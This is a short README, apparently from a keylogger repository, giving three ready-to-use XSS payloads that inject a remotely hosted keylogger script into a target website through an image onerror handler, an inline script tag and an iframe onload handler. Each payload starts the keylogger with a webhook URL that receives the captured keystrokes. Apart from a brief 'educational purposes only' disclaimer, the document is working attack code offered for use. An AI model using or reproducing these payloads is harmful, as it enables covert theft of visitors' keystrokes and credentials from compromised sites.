# `Keylogger.js` XSS Payload Examples
The following are examples of XSS payloads that can be used to inject the `Keylogger.js` script into a target website.

## ⚠️ Disclaimer
Usage of this script without the consent of the target is illegal. This repository is for educational purposes only. The author will not be held responsible for any misuse of this script.

## Examples

```html
<!-- Using image tag with onerror event -->
<img src="-" onerror="import('https://unpkg.com/@mihnea.dev/keylogger.js/dist/index.js').then(module => { 
    const Keylogger = module.default; 
    const keylogger = new Keylogger('https://your-webhook-url.com', false); 
    console.log('Keylogger started:', keylogger); 
});" />
<!-- Using <script> with inline JavaScript -->
<script>
  import('https://unpkg.com/@mihnea.dev/keylogger.js/dist/index.js').then(module => { 
      const Keylogger = module.default; 
      const keylogger = new Keylogger('https://your-webhook-url.com', false); 
      console.log('Keylogger started:', keylogger); 
  });
</script>
<!-- Using <iframe> with onload event -->
<iframe src="javascript:void(0)" onload="import('https://unpkg.com/@mihnea.dev/keylogger.js/dist/index.js').then(module => { 
    const Keylogger = module.default; 
    const keylogger = new Keylogger('https://your-webhook-url.com', false); 
    console.log('Keylogger started:', keylogger); 
});">
</iframe>
```
